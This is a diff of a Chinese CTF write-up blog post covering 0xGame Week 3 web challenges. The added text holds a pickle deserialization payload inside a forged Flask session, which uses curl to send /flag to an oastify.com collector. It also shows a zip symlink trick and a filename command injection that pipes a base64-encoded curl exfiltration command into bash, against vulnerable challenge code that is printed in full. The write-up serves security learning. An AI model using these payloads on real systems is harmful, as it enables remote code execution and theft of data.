@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#notebook%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">notebook（未完成）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rss-parser%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">rss_parser（未完成）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-file-manager%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">zip_file_manager（未完成）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-snapshot%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">web_snapshot（未完成）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GoShop"><span class="toc-text">GoShop</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#notebook%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">notebook（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rss-parser%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">rss_parser（未完成）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-file-manager%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">zip_file_manager（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-text">软链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">命令注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-snapshot%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">web_snapshot（未完成）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GoShop"><span class="toc-text">GoShop</span></a></li></ol></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.6k字</span>
+        <span class="post-count">2.4k字</span>
       </span>
     </span>
 
@@ -257,7 +257,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">9分</span>
+        <span class="post-count">12分</span>
       </span>
     </span>
     
@@ -277,7 +277,7 @@
 <p>web完成度1&#x2F;4</p>
 <span id="more"></span>
 
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="notebook（未完成）"><a href="#notebook（未完成）" class="headerlink" title="notebook（未完成）"></a>notebook（未完成）</h2><blockquote>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="notebook（复现）"><a href="#notebook（复现）" class="headerlink" title="notebook（复现）"></a>notebook（复现）</h2><blockquote>
 <p>session伪造爆破+pickle反序列化</p>
 </blockquote>
 <p>app.py</p>
@@ -424,35 +424,136 @@ app<span class="token punctuation">.</span>config<span class="token punctuation"
 
 <p><img src="/blog/2023/10/17/0xGameCTF-Week3/image-20231019231123811.png" alt="image-20231019231123811"></p>
 <p>很明显，要想进行命令执行，就要修改里面的二进制字节流</p>
-<p>用pker工具生成opcode</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#pker_test.py</span>
- 
-i <span class="token operator">=</span> <span class="token number">0</span>
-s <span class="token operator">=</span> <span class="token string">'ls'</span>
-lst <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token punctuation">]</span>
-tpl <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
-dct <span class="token operator">=</span> <span class="token punctuation">&#123;</span>tpl<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>
-system <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span>
-system<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-<span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>手搓一个opcode，pker工具生成的opcode好像不怎么好使。。。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">b'''cos
+system
+(S'whoami'
+tR.'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 pker.py <span class="token operator">&lt;</span> pker_test.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>也即<code>b&#39;&#39;&#39;cos\nsystem\n(S&#39;whoami&#39;\ntR.&#39;&#39;&#39;</code></p>
+<p>带进去session伪造即可，其实可以直接使用flask-unsign解决</p>
+<p>注： </p>
+<ul>
+<li><p>如果使用<code>pickle.dumps()</code>来⽣成 payload, 那么得知道不同操作系统⽣成的 pickle 序列化数据是有区别的</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Linux (注意 posix)</span>
+<span class="token string">b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span>
+<span class="token comment"># Windows (注意 nt)</span>
+<span class="token string">b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>构造了恶意 pickle 序列化数据发送之后服务器报错 500，</p>
+</li>
+<li><p>上⾯代码在 <code>pickle.loads()</code> 之后得到 note 对象, 然后访问它的id，name，content属性，即 note.id，note.name，note.content如果是正常的 pickle 数据，那么服务器就会显示正常的 note 内容，如果是恶意的 pickle 数据，那么 <code>pickle.loads()</code> 返回的就是通过 <code>__reduce__</code> ⽅法调⽤的某个函数所返回的结果, 根本就没有 id, name, content 这些属性，当然就会报错。换成<code>os.system()</code> 同理, 在 Linux 中通过这个函数执⾏的命令, 如果执⾏成功, 则返回 0, 否则返回非0值，虽然服务器会报错 500, 但是命令还是执行成功的</p>
+</li>
+<li><p>回显的内容不会在网页上输出，需要反弹shell或者dns带外</p>
+</li>
+</ul>
+<p>这里用dns带外的方法：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">b'''cos\nsystem\n(S'curl 5cidlk6fmr0rtmpjbmx2fxrujlpbd0.oastify.com -X POST -d \"`cat /flag`\"'\ntR.'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>得到<code>b&#39;I0\np0\n0S&#39;ls&#39;\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.&#39;</code></p>
-<p>带进去session伪造即可</p>
 <ul>
 <li>Hint 1: 由于题目环境每 10 分钟重置一次 因此 SECRET_KEY 的值会变化</li>
 </ul>
-<p>思路大概就是这样，但是要10分钟之内做完，emmm。。。先放一会（</p>
-<p>试了一下，没出来。。。</p>
+<p>10分钟速通感觉还是挺难的（</p>
+<p>先创建一个新的note，然后session伪造</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">flask<span class="token operator">-</span>unsign <span class="token operator">-</span><span class="token operator">-</span>sign <span class="token operator">-</span><span class="token operator">-</span>cookie <span class="token string">"&#123;'notes': &#123;'2392a14b-5f40-45ed-9f2d-85aa3467d13e': b'''cos\nsystem\n(S'curl qpjyy5j0zcdc6724o7ansi4fw62zqo.oastify.com -X POST -d \"`cat /flag`\"'\ntR.'''&#125;&#125;"</span> <span class="token operator">-</span><span class="token operator">-</span>secret <span class="token string">'4b42'</span> <span class="token operator">-</span><span class="token operator">-</span>no<span class="token operator">-</span>literal<span class="token operator">-</span><span class="token builtin">eval</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/17/0xGameCTF-Week3/image-20231025174914976.png" alt="image-20231025174914976"></p>
+<p><img src="/blog/2023/10/17/0xGameCTF-Week3/image-20231025175003577.png" alt="image-20231025175003577"></p>
+<p>最后带外的结果是这样，应该没问题吧（心虚</p>
 <hr>
 <h2 id="rss-parser（未完成）"><a href="#rss-parser（未完成）" class="headerlink" title="rss_parser（未完成）"></a>rss_parser（未完成）</h2><blockquote>
 <p>xxe+flask算pin</p>
 </blockquote>
 <hr>
-<h2 id="zip-file-manager（未完成）"><a href="#zip-file-manager（未完成）" class="headerlink" title="zip_file_manager（未完成）"></a>zip_file_manager（未完成）</h2><blockquote>
+<h2 id="zip-file-manager（复现）"><a href="#zip-file-manager（复现）" class="headerlink" title="zip_file_manager（复现）"></a>zip_file_manager（复现）</h2><blockquote>
 <p>unzip漏洞</p>
 </blockquote>
+<p>其实和今年国赛的unzip是一样的考点， 只不过换成了python框架</p>
+<p>不过这题有两种做法</p>
+<p>app.py</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> send_file
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> os
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>m<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/unzip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+
+    user_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./uploads'</span><span class="token punctuation">,</span> md5<span class="token punctuation">(</span>request<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>user_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>user_dir<span class="token punctuation">)</span>
+
+    zip_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>user_dir<span class="token punctuation">,</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
+    dest_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>user_dir<span class="token punctuation">,</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span>
+
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'unzip -o &#123;&#125; -d &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> dest_path<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> defaults<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'subpath'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/&lt;path:subpath>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>subpath<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    user_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./uploads'</span><span class="token punctuation">,</span> md5<span class="token punctuation">(</span>request<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>user_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>user_dir<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token string">'..'</span> <span class="token keyword">in</span> subpath<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'blacklist'</span>
+
+    current_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>user_dir<span class="token punctuation">,</span> subpath<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>current_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'Directory'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'..'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> v <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>current_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>current_path<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'File'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> v<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'Directory'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> v<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> upload_path<span class="token operator">=</span>user_dir<span class="token punctuation">,</span> res<span class="token operator">=</span>res<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>current_path<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> / <span class="token builtin class-name">test</span>
+<span class="token function">zip</span> <span class="token parameter variable">-y</span> test.zip <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>因为题目已经提供了查看文件的功能，所以这里把软链接直接指向根目录</p>
+<p>上传test.zip，然后访问test即可查看根目录获得flag</p>
+<hr>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/unzip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+
+    user_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./uploads'</span><span class="token punctuation">,</span> md5<span class="token punctuation">(</span>request<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>user_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>user_dir<span class="token punctuation">)</span>
+
+    zip_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>user_dir<span class="token punctuation">,</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
+    dest_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>user_dir<span class="token punctuation">,</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span>
+
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'unzip -o &#123;&#125; -d &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> dest_path<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>审计这段代码，可以发现这里调用了<code>os.system</code>执行unzip命令，但是路径名是直接拼接进去的，而zip的文件名可控，所以存在命令注入</p>
+<p>burp上传时抓包把 filename 改成下面的命令把回显带外即可，类似于ping的命令注入</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">test.zip<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token assign-left variable">Y3VybCBob3N0LmRvY2tlci5pbnRlcm5hbDo0NDQ0IC1UIC9mbGFnCg</span><span class="token operator">==</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span><span class="token punctuation">;</span><span class="token number">1</span>.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <hr>
 <h2 id="web-snapshot（未完成）"><a href="#web-snapshot（未完成）" class="headerlink" title="web_snapshot（未完成）"></a>web_snapshot（未完成）</h2><hr>
 <h2 id="GoShop"><a href="#GoShop" class="headerlink" title="GoShop"></a>GoShop</h2><blockquote>
